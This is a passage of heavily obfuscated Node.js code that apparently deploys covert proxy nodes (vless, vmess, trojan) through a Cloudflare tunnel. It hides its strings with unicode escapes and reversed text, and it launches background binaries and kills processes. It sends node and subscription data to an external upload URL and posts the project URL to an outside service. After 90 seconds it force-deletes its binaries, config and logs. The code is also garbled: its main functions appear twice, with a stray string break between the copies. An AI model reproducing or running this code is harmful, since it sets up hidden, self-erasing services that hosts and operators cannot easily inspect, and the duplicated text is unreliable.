  `;fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"lmy.lennut".split("").reverse().join("")),_0xe32fa);}else{console['\u006C\u006F\u0067']("\u0041\u0052\u0047\u004F\u005F\u0041\u0055\u0054\u0048\u0020\u006D\u0069\u0073\u006D\u0061\u0074\u0063\u0068\u0020\u0054\u0075\u006E\u006E\u0065\u006C\u0053\u0065\u0063\u0072\u0065\u0074\u002C\u0075\u0073\u0065\u0020\u0074\u006F\u006B\u0065\u006E\u0020\u0063\u006F\u006E\u006E\u0065\u0063\u0074\u0020\u0074\u006F\u0020\u0074\u0075\u006E\u006E\u0065\u006C");}}argoType();// 获取临时隧道domain
async function extractDomains(_0x0fa69e){if(ARGO_AUTH&&ARGO_DOMAIN){_0x0fa69e=ARGO_DOMAIN;console['\u006C\u006F\u0067'](":NIAMOD_OGRA".split("").reverse().join(""),_0x0fa69e);await _0x48eadb(_0x0fa69e);}else{try{var _0xdb3db=(114755^114758)+(437057^437064);const _0xb2_0x9e4=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"\u0062\u006F\u006F\u0074\u002E\u006C\u006F\u0067"),"8-ftu".split("").reverse().join(""));_0xdb3db='\u0064\u0069\u006C\u006E\u006D\u0068';var _0x2585bd=(547995^547996)+(915436^915429);const _0xe62a2b=_0xb2_0x9e4['\u0073\u0070\u006C\u0069\u0074']("\u000A");_0x2585bd=(764702^764695)+(533370^533371);let _0xb_0x44g;const _0x3c2d9d=[];_0xb_0x44g=952163^952160;_0xe62a2b['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](line=>{var _0x7b477c=(485410^485418)+(962299^962303);const _0x1g245b=line['\u006D\u0061\u0074\u0063\u0068'](new RegExp("?/\\)moc.\\eralfduolcyrt*] ^[(/\\/\\:?sptth".split("").reverse().join(""),""));_0x7b477c=(968766^968764)+(710263^710260);if(_0x1g245b){var _0xd887ca=(644391^644385)+(407456^407465);const _0x677d=_0x1g245b[322380^322381];_0xd887ca=(676880^676888)+(565297^565297);_0x3c2d9d['\u0070\u0075\u0073\u0068'](_0x677d);}});if(_0x3c2d9d['\u006C\u0065\u006E\u0067\u0074\u0068']>(818564^818564)){_0x0fa69e=_0x3c2d9d[773356^773356];console['\u006C\u006F\u0067']("\u0041\u0072\u0067\u006F\u0044\u006F\u006D\u0061\u0069\u006E\u003A",_0x0fa69e);await _0x48eadb(_0x0fa69e);}else{console['\u006C\u006F\u0067']("\u0041\u0072\u0067\u006F\u0044\u006F\u006D\u0061\u0069\u006E\u0020\u006E\u006F\u0074\u0020\u0066\u006F\u0075\u006E\u0064\u002C\u0020\u0072\u0065\u002D\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u0020\u0062\u006F\u0074\u0020\u0074\u006F\u0020\u006F\u0062\u0074\u0061\u0069\u006E\u0020\u0041\u0072\u0067\u006F\u0044\u006F\u006D\u0061\u0069\u006E");// 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
fs['\u0075\u006E\u006C\u0069\u006E\u006B\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](FILE_PATH,"gol.toob".split("").reverse().join("")));async function _0x2g6d(){try{// Windows系统使用taskkill命令
if(process['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D']==="\u0077\u0069\u006E\u0033\u0032"){await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);}else{await exec(`pkill -f "[${botName['\u0063\u0068\u0061\u0072\u0041\u0074'](488801^488801)}]${botName['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](855733^855732)}" > /dev/null 2>&1`);}}catch(error){// 忽略输出
}}_0x2g6d();await new Promise(resolve=>setTimeout(resolve,371081^369201));var _0xdd3fbf=(144194^144202)+(712503^712511);const _0xcecb2e=`tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;_0xdd3fbf=(719934^719935)+(884361^884353);try{await exec(`nohup ${botPath} ${_0xcecb2e} >/dev/null 2>&1 &`);console['\u006C\u006F\u0067'](`${botName} is running`);await new Promise(resolve=>setTimeout(resolve,199251^197099));await extractDomains();// 重新提取域名
}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`Error executing command: ${error}`);}}}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](":gol.toob gnidaer rorrE".split("").reverse().join(""),error);}}// 生成 list 和 sub 信息
async function _0x48eadb(argoDomain,_0x9a48a){const _0x3adce=execSync("'g/_/ /s' e- des | '}81$\"-\"62$ tnirp{' \"\\F- kwa | atem/moc.eralfduolc.deeps//:sptth 5 ms- lruc".split("").reverse().join(""),{"encoding":'utf-8'});var _0x866f2b=(291908^291909)+(834894^834890);const _0x9bc=_0x3adce['\u0074\u0072\u0069\u006D']();// 如果 NAME 为空，则只使用 ISP 作为名称
_0x866f2b='\u006A\u006A\u0062\u006C\u0071\u0069';const _0x44dffb=NAME?`${NAME}-${_0x9bc}`:_0x9bc;_0x9a48a=(715936^715942)+(786629^786628);return new Promise(resolve=>{setTimeout(()=>{var _0xf5b=(348153^348156)+(519430^519425);const _0xe60c={'\u0076':"\u0032",'\u0070\u0073':`${_0x44dffb}`,"add":CFIP,"port":CFPORT,'\u0069\u0064':UUID,'\u0061\u0069\u0064':"\u0030","scy":"\u006E\u006F\u006E\u0065",'\u006E\u0065\u0074':"\u0077\u0073",'\u0074\u0079\u0070\u0065':'none','\u0068\u006F\u0073\u0074':argoDomain,'\u0070\u0061\u0074\u0068':'/vmess-argo?ed=2560',"tls":'tls',"sni":argoDomain,'\u0061\u006C\u0070\u006E':'',"fp":'firefox'};_0xf5b=704687^704684;let _0x0dfa;const _0xa_0x9a0=`
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${_0x44dffb}
  
vmess://${Buffer['\u0066\u0072\u006F\u006D'](JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079'](_0xe60c))['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034")}
  
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${_0x44dffb}
    `;// 打印 sub.txt 内容到控制台
_0x0dfa=(994707^994708)+(841839^841837);console['\u006C\u006F\u0067'](Buffer['\u0066\u0072\u006F\u006D'](_0xa_0x9a0)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join("")));fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,Buffer['\u0066\u0072\u006F\u006D'](_0xa_0x9a0)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join("")));console['\u006C\u006F\u0067'](`${FILE_PATH}/sub.txt saved successfully`);uploadNodes();// 将内容进行 base64 编码并写入 SUB_PATH 路由
app['\u0067\u0065\u0074'](`/${SUB_PATH}`,(req,res)=>{const _0xafd=Buffer['\u0066\u0072\u006F\u006D'](_0xa_0x9a0)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join(""));res['\u0073\u0065\u0074']("\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065","8-ftu=tesrahc ;nialp/txet".split("").reverse().join(""));res['\u0073\u0065\u006E\u0064'](_0xafd);});resolve(_0xa_0x9a0);},297225^298713);});}}// 自动上传节点或订阅
async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){const _0xd1d6a=`${PROJECT_URL}/${SUB_PATH}`;var _0x13aa9e=(641798^641794)+(760525^760524);const jsonData={'\u0073\u0075\u0062\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006F\u006E':[_0xd1d6a]};_0x13aa9e=388487^388481;try{const response=await axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-subscriptions`,jsonData,{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'application/json'}});if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(790973^790901)){console['\u006C\u006F\u0067']("yllufsseccus dedaolpu noitpircsbuS".split("").reverse().join(""));return response;}else{return null;//  console.log('Unknown response status');
}}catch(error){if(error['\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065']){if(error['\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065']['\u0073\u0074\u0061\u0074\u0075\u0073']===(897325^897213)){//  console.error('Subscription already exists');
}}}}else if(UPLOAD_URL){if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](listPath))return;const _0x112c=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](listPath,"\u0075\u0074\u0066\u002D\u0038");var _0xd9adba=(481683^481680)+(148408^148410);const _0xd534c=_0x112c['\u0073\u0070\u006C\u0069\u0074']("\u000A")['\u0066\u0069\u006C\u0074\u0065\u0072'](line=>new RegExp("/\\/\\:)ciut|2airetsyh|najort|ssemv|sselv(".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](line));_0xd9adba=918673^918674;if(_0xd534c['\u006C\u0065\u006E\u0067\u0074\u0068']===(336896^336896))return;var _0x_0xeb5=(614149^614150)+(388386^388394);const jsonData=JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079']({"nodes":_0xd534c});_0x_0xeb5='\u006A\u0062\u0069\u006C\u0069\u006F';try{const response=await axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-nodes`,jsonData,{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'application/json'}});if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(855065^855249)){console['\u006C\u006F\u0067']("yllufsseccus dedaolpu sedoN".split("").reverse().join(""));return response;}else{return null;}}catch(error){return null;}}else{// console.log('Skipping upload nodes');
return;}}// 90s后删除相关文件
function cleanFiles(){setTimeout(()=>{const _0x565eb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){_0x565eb['\u0070\u0075\u0073\u0068'](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0x565eb['\u0070\u0075\u0073\u0068'](phpPath);}// Windows系统使用不同的删除命令
if(process['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D']==="\u0077\u0069\u006E\u0033\u0032"){exec(`del /f /q ${_0x565eb['\u006A\u006F\u0069\u006E']("\u0020")} > nul 2>&1`,error=>{console['\u0063\u006C\u0065\u0061\u0072']();console['\u006C\u006F\u0067']("\u0041\u0070\u0070\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");console['\u006C\u006F\u0067']("\u0054\u0068\u0061\u006E\u006B\u0020\u0079\u006F\u0075\u0020\u0066\u006F\u0072\u0020\u0075\u0073\u0069\u006E\u0067\u0020\u0074\u0068\u0069\u0073\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u002C\u0020\u0065\u006E\u006A\u006F\u0079\u0021");});}else{exec(`rm -rf ${_0x565eb['\u006A\u006F\u0069\u006E']("\u0020")} >/dev/null 2>&1`,error=>{console['\u0063\u006C\u0065\u0061\u0072']();console['\u006C\u006F\u0067']("\u0041\u0070\u0070\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");console['\u006C\u006F\u0067']("\u0054\u0068\u0061\u006E\u006B\u0020\u0079\u006F\u0075\u0020\u0066\u006F\u0072\u0020\u0075\u0073\u0069\u006E\u0067\u0020\u0074\u0068\u0069\u0073\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u002C\u0020\u0065\u006E\u006A\u006F\u0079\u0021");});}},90000);// 90s
}cleanFiles();// 自动访问项目URL
async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console['\u006C\u006F\u0067']("ksat ssecca citamotua gnidda gnippikS".split("").reverse().join(""));return;}try{var _0xce_0x65a=(164047^164040)+(989539^989541);const _0x1cc=await axios['\u0070\u006F\u0073\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006F\u006F\u006F\u006F\u002E\u0073\u0065\u0072\u0076\u0030\u0030\u002E\u006E\u0065\u0074\u002F\u0061\u0064\u0064\u002D\u0075\u0072\u006C",{'\u0075\u0072\u006C':PROJECT_URL},{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});// console.log(`${JSON.stringify(response.data)}`);
_0xce_0x65a='\u006D\u0064\u006B\u0063\u006D\u0063';console['\u006C\u006F\u0067'](`automatic access task added successfully`);return _0x1cc;}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`Add automatic access task faild: ${error['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`);return null;}}// 主运行逻辑
async function startserver(){try{deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask();}catch(error){console['\u0065\u0072\u0072\u006F\u0072']("\u0045\u0072\u0072\u006F\u0072\u0020\u0069\u006E\u0020\u0073\u0074\u0061\u0072\u0074\u0073\u0065\u0072\u0076\u0065\u0072\u003A",error);}}startserver()['\u0063\u0061\u0074\u0063\u0068'](error=>{console['\u0065\u0072\u0072\u006F\u0072']("\u0055\u006E\u0068\u0061\u006E\u0064\u006C\u0065\u0064\u0020\u0065\u0072\u0072\u006F\u0072\u0020\u0069\u006E\u0020\u0073\u0074\u0061\u0072\u0074\u0073\u0065\u0072\u0076\u0065\u0072\u003A",error);});app['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT,()=>console['\u006C\u006F\u0067'](`http server is running on port:${PORT}!`));    `;_0x43de=(911702^911699)+(631685^631681);console['\u006C\u006F\u0067'](Buffer['\u0066\u0072\u006F\u006D'](_0x9a756f)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join("")));fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](subPath,Buffer['\u0066\u0072\u006F\u006D'](_0x9a756f)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("46esab".split("").reverse().join("")));console['\u006C\u006F\u0067'](`${FILE_PATH}/sub.txt saved successfully`);uploadNodes();app['\u0067\u0065\u0074'](`/${SUB_PATH}`,(req,res)=>{const _0x5abbda=Buffer['\u0066\u0072\u006F\u006D'](_0x9a756f)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']("\u0062\u0061\u0073\u0065\u0036\u0034");res['\u0073\u0065\u0074']("\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065","\u0074\u0065\u0078\u0074\u002F\u0070\u006C\u0061\u0069\u006E\u003B\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u003D\u0075\u0074\u0066\u002D\u0038");res['\u0073\u0065\u006E\u0064'](_0x5abbda);});resolve(_0x9a756f);},879038^880238);});}}async function uploadNodes(){if(UPLOAD_URL&&PROJECT_URL){var _0xd9527f=(449296^449305)+(945563^945565);const _0xfb548a=`${PROJECT_URL}/${SUB_PATH}`;_0xd9527f=848726^848726;const jsonData={'\u0073\u0075\u0062\u0073\u0063\u0072\u0069\u0070\u0074\u0069\u006F\u006E':[_0xfb548a]};try{var _0x95fc5e=(718666^718666)+(334536^334543);const response=await axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-subscriptions`,jsonData,{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});_0x95fc5e=(624894^624894)+(949166^949167);if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(138796^138980)){console['\u006C\u006F\u0067']("yllufsseccus dedaolpu noitpircsbuS".split("").reverse().join(""));return response;}else{return null;}}catch(error){if(error['\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065']){if(error['\u0072\u0065\u0073\u0070\u006F\u006E\u0073\u0065']['\u0073\u0074\u0061\u0074\u0075\u0073']===(399893^400261)){}}}}else if(UPLOAD_URL){if(!fs['\u0065\u0078\u0069\u0073\u0074\u0073\u0053\u0079\u006E\u0063'](listPath))return;let _0x848e;const _0x9eeb=fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](listPath,"\u0075\u0074\u0066\u002D\u0038");_0x848e=781759^781759;const _0x6cde=_0x9eeb['\u0073\u0070\u006C\u0069\u0074']("\u000A")['\u0066\u0069\u006C\u0074\u0065\u0072'](line=>new RegExp("/\\/\\:)ciut|2airetsyh|najort|ssemv|sselv(".split("").reverse().join(""),"")['\u0074\u0065\u0073\u0074'](line));if(_0x6cde['\u006C\u0065\u006E\u0067\u0074\u0068']===(395542^395542))return;let _0x4dc;const jsonData=JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079']({"nodes":_0x6cde});_0x4dc=938219^938223;try{const response=await axios['\u0070\u006F\u0073\u0074'](`${UPLOAD_URL}/api/add-nodes`,jsonData,{'\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{'Content-Type':"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});if(response&&response['\u0073\u0074\u0061\u0074\u0075\u0073']===(611932^611988)){console['\u006C\u006F\u0067']("\u004E\u006F\u0064\u0065\u0073\u0020\u0075\u0070\u006C\u006F\u0061\u0064\u0065\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079");return response;}else{return null;}}catch(error){return null;}}else{return;}}function cleanFiles(){setTimeout(()=>{const _0xfa_0x35b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){_0xfa_0x35b['\u0070\u0075\u0073\u0068'](npmPath);}else if(NEZHA_SERVER&&NEZHA_KEY){_0xfa_0x35b['\u0070\u0075\u0073\u0068'](phpPath);}if(process['\u0070\u006C\u0061\u0074\u0066\u006F\u0072\u006D']==="\u0077\u0069\u006E\u0033\u0032"){exec(`del /f /q ${_0xfa_0x35b['\u006A\u006F\u0069\u006E']("\u0020")} > nul 2>&1`,error=>{console['\u0063\u006C\u0065\u0061\u0072']();console['\u006C\u006F\u0067']("\u0041\u0070\u0070\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");console['\u006C\u006F\u0067']("!yojne ,tpircs siht gnisu rof uoy knahT".split("").reverse().join(""));});}else{exec(`rm -rf ${_0xfa_0x35b['\u006A\u006F\u0069\u006E']("\u0020")} >/dev/null 2>&1`,error=>{console['\u0063\u006C\u0065\u0061\u0072']();console['\u006C\u006F\u0067']("\u0041\u0070\u0070\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");console['\u006C\u006F\u0067']("\u0054\u0068\u0061\u006E\u006B\u0020\u0079\u006F\u0075\u0020\u0066\u006F\u0072\u0020\u0075\u0073\u0069\u006E\u0067\u0020\u0074\u0068\u0069\u0073\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u002C\u0020\u0065\u006E\u006A\u006F\u0079\u0021");});}},90000);}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console['\u006C\u006F\u0067']("\u0053\u006B\u0069\u0070\u0070\u0069\u006E\u0067\u0020\u0061\u0064\u0064\u0069\u006E\u0067\u0020\u0061\u0075\u0074\u006F\u006D\u0061\u0074\u0069\u0063\u0020\u0061\u0063\u0063\u0065\u0073\u0073\u0020\u0074\u0061\u0073\u006B");return;}try{let _0xdcac3b;const _0xc59a=await axios['\u0070\u006F\u0073\u0074']("lru-dda/ten.00vres.oooo//:sptth".split("").reverse().join(""),{'\u0075\u0072\u006C':PROJECT_URL},{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"}});_0xdcac3b=662040^662043;console['\u006C\u006F\u0067'](`automatic access task added successfully`);return _0xc59a;}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`Add automatic access task faild: ${error['\u006D\u0065\u0073\u0073\u0061\u0067\u0065']}`);return null;}}async function startserver(){try{deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask();}catch(error){console['\u0065\u0072\u0072\u006F\u0072']("\u0045\u0072\u0072\u006F\u0072\u0020\u0069\u006E\u0020\u0073\u0074\u0061\u0072\u0074\u0073\u0065\u0072\u0076\u0065\u0072\u003A",error);}}startserver()['\u0063\u0061\u0074\u0063\u0068'](error=>{console['\u0065\u0072\u0072\u006F\u0072']("\u0055\u006E\u0068\u0061\u006E\u0064\u006C\u0065\u0064\u0020\u0065\u0072\u0072\u006F\u0072\u0020\u0069\u006E\u0020\u0073\u0074\u0061\u0072\u0074\u0073\u0065\u0072\u0076\u0065\u0072\u003A",error);});app['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT,()=>console['\u006C\u006F\u0067'](`http server is running on port:${PORT}!`));
